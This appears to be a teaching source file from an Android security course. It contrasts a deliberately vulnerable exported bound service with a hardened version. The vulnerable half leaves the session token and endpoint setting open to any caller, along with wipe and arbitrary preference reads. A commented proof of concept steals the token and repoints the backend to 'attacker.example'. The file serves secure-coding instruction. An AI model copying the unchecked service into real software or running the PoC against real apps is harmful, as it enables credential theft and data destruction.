/*
 * examples/AdminService.java
 * =========================
 *
 * The code behind this declaration in vulnerable-manifest.xml:
 *
 *     <service android:name=".AdminService" android:exported="true">
 *         <intent-filter>
 *             <action android:name="com.example.vulnerable.ADMIN" />
 *         </intent-filter>
 *     </service>
 *
 * WHY THIS FILE EXISTS
 *   A manifest tells you WHETHER THE DOOR OPENS. It cannot tell you what is
 *   behind it. "Exported service" is an observation; "any installed app can
 *   read this app's session token, repoint its backend, and wipe its local
 *   data" is a finding. The distance between those two sentences is this file.
 *
 *   An exported bound Service is often WORSE than an exported Activity. The
 *   attacker does not get one screen with one Intent — they get an IBinder and
 *   can call every method on the interface, with arbitrary arguments,
 *   repeatedly, with no UI, and with no user interaction at all.
 *
 * DO NOT SHIP ANY PART OF THE VULNERABLE HALF OF THIS FILE.
 * It is written to be attacked. The secure version is at the bottom.
 */

package com.example.vulnerable;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Binder;
import android.os.IBinder;
import android.os.Process;
import android.util.Log;

/* ------------------------------------------------------------------------- *
 *  The AIDL interface (src/main/aidl/com/example/vulnerable/IAdmin.aidl)
 *
 *      interface IAdmin {
 *          String getSessionToken();
 *          void   setApiEndpoint(String url);
 *          void   wipeLocalData();
 *          String readPreference(String key);
 *      }
 *
 *  AIDL generates IAdmin.Stub, which extends android.os.Binder and declares one
 *  TRANSACTION_<method> constant per method. Those constants are what you look
 *  for in JADX when you find an exported Service:
 *
 *      grep -rn 'TRANSACTION_' out/sources/com/example/vulnerable/
 *
 *  Each one is a callable entry point reachable with Binder.transact().
 * ------------------------------------------------------------------------- */

public class AdminService extends Service {

    private static final String TAG = "AdminService";

    /* ===================================================================== *
     *  VULNERABLE
     * ===================================================================== */

    private final IAdmin.Stub mBinder = new IAdmin.Stub() {

        @Override
        public String getSessionToken() {
            // No caller check at all. Every bound client gets the token.
            //
            // Why a developer writes this: the companion app needs the token to
            // stay signed in, exported="true" made that work, and the code was
            // never revisited. The interface was designed for a trusted caller
            // and the manifest never established that the caller is trusted.
            return Prefs.get(AdminService.this, "auth_token");
        }

        @Override
        public void setApiEndpoint(String url) {
            // Attacker-controlled server URL, persisted. Every subsequent
            // request from this app goes wherever the caller says — including
            // requests carrying the session token above.
            Prefs.put(AdminService.this, "api_base", url);
        }

        @Override
        public void wipeLocalData() {
            // Remote, unauthenticated destruction of the user's local data.
            Storage.wipe(AdminService.this);
        }

        @Override
        public String readPreference(String key) {
            // An arbitrary-read primitive over the app's own preferences.
            // Even without a named "token" method, this one call is enough.
            return Prefs.get(AdminService.this, key);
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "onBind from uid=" + Binder.getCallingUid());   // logged, not checked
        return mBinder;
    }

    /* ===================================================================== *
     *  HOW AN ATTACKER REACHES IT
     * =====================================================================
     *
     *  From an UNPRIVILEGED app with no permissions at all. Note the <queries>
     *  entry, which is required from Android 11 for the ComponentName to
     *  resolve — without it the bind silently fails and you will misread the
     *  result as "not reachable":
     *
     *      <queries><package android:name="com.example.vulnerable" /></queries>
     *
     *      Intent i = new Intent();
     *      i.setComponent(new ComponentName(
     *              "com.example.vulnerable",
     *              "com.example.vulnerable.AdminService"));
     *      bindService(i, new ServiceConnection() {
     *          @Override public void onServiceConnected(ComponentName c, IBinder b) {
     *              IAdmin admin = IAdmin.Stub.asInterface(b);
     *              try {
     *                  Log.i("PoC", "token = " + admin.getSessionToken());
     *                  admin.setApiEndpoint("https://attacker.example/");
     *              } catch (RemoteException e) { … }
     *          }
     *          @Override public void onServiceDisconnected(ComponentName c) { }
     *      }, Context.BIND_AUTO_CREATE);
     *
     *  ⚠ Reaching this from `adb shell` proves nothing. `adb shell` runs as
     *    UID 2000 and holds privileges an ordinary app does not. Reproduce from
     *    an unprivileged app before you write it up — see
     *    ../labs/lab-03-proving-reachability.md.
     * ===================================================================== */

    /* ===================================================================== *
     *  SECURE — both halves are required
     * ===================================================================== */

    /*
     * HALF 1 — the manifest closes the door:
     *
     *     <service android:name=".AdminService" android:exported="false" />
     *
     * If a sibling app genuinely must reach it, then instead:
     *
     *     <service android:name=".AdminService"
     *              android:exported="true"
     *              android:permission="com.example.app.permission.INTERNAL_IPC" />
     *
     *     <permission android:name="com.example.app.permission.INTERNAL_IPC"
     *                 android:protectionLevel="signature" />
     *
     * A signature permission is the only manifest-level control that means
     * anything against a third-party attacker. A "normal" permission — which is
     * also what you get by OMITTING protectionLevel — is granted automatically
     * to any app that declares <uses-permission>, so it is not a control at all.
     *
     * HALF 2 — the code checks the identity of anyone let through anyway.
     * Manifest protection gives ONE decision for the whole interface. An in-code
     * check gives one per operation, which is what you want when three of the
     * four methods are read-only and one wipes the user's data.
     */

    private final IAdmin.Stub mSecureBinder = new IAdmin.Stub() {

        @Override
        public String getSessionToken() {
            requireTrustedCaller();
            // Even for a trusted caller, hand out a scoped, short-lived token
            // rather than the long-lived credential itself.
            return TokenIssuer.issueScopedToken(AdminService.this,
                                                Binder.getCallingUid(),
                                                /* ttlSeconds = */ 300);
        }

        @Override
        public void setApiEndpoint(String url) {
            requireTrustedCaller();
            // Never persist a caller-supplied endpoint. If configurability is a
            // real requirement, validate against a compiled-in allow-list.
            if (!Endpoints.isAllowed(url)) {
                throw new SecurityException("endpoint not permitted: " + url);
            }
            Prefs.put(AdminService.this, "api_base", url);
        }

        @Override
        public void wipeLocalData() {
            requireTrustedCaller();
            // Destructive operations need user confirmation, not just caller
            // authorisation. Start a confirmation Activity instead of acting.
            ConfirmWipeActivity.request(AdminService.this);
        }

        @Override
        public String readPreference(String key) {
            requireTrustedCaller();
            // Never expose a generic key-value read across an IPC boundary.
            // Enumerate exactly what may be read.
            if (!Prefs.PUBLIC_KEYS.contains(key)) {
                throw new SecurityException("key not exposed: " + key);
            }
            return Prefs.get(AdminService.this, key);
        }
    };

    /**
     * The canonical caller check.
     *
     * Binder.getCallingUid() is supplied by the kernel binder driver, not by the
     * caller, so it cannot be forged. That is the whole reason this works — see
     * ../../25-Binder/README.md.
     *
     * Note what is deliberately NOT used here:
     *   - the package NAME from the Intent (attacker-controlled)
     *   - getCallingPackage() alone (a UID can own several packages)
     *   - a check performed in onBind() only (the binder object outlives the
     *     bind, so the check must be per-transaction)
     */
    private void requireTrustedCaller() {
        int uid = Binder.getCallingUid();
        if (uid == Process.myUid()) {
            return;                       // our own process
        }
        String[] pkgs = getPackageManager().getPackagesForUid(uid);
        if (pkgs == null || pkgs.length == 0) {
            throw new SecurityException("unknown caller uid=" + uid);
        }
        for (String p : pkgs) {
            // Compare signing certificates, not package names. On API 28+ use
            // PackageManager.checkSignatures(myUid, uid) == SIGNATURE_MATCH, or
            // hasSigningCertificate() with a pinned digest.
            if (getPackageManager().checkSignatures(Process.myUid(), uid)
                    == PackageManager.SIGNATURE_MATCH) {
                return;
            }
            Log.w(TAG, "rejected caller package " + p);
        }
        throw new SecurityException("caller uid=" + uid + " is not trusted");
    }

    /* ---------------------------------------------------------------------
     * Stubs so this file reads as complete. Not part of the lesson.
     * ------------------------------------------------------------------ */

    static final class Prefs {
        static final java.util.Set<String> PUBLIC_KEYS =
                new java.util.HashSet<>(java.util.Arrays.asList("theme", "locale"));
        static String get(android.content.Context c, String k) { return null; }
        static void put(android.content.Context c, String k, String v) { }
    }

    static final class Storage {
        static void wipe(android.content.Context c) { }
    }

    static final class Endpoints {
        static boolean isAllowed(String url) { return false; }
    }

    static final class TokenIssuer {
        static String issueScopedToken(android.content.Context c, int uid, int ttl) {
            return null;
        }
    }

    static final class ConfirmWipeActivity {
        static void request(android.content.Context c) { }
    }

    interface IAdmin extends android.os.IInterface {
        String getSessionToken();
        void setApiEndpoint(String url);
        void wipeLocalData();
        String readPreference(String key);

        abstract class Stub extends Binder implements IAdmin {
            public static IAdmin asInterface(IBinder b) { return null; }
            @Override public IBinder asBinder() { return this; }
        }
    }
}
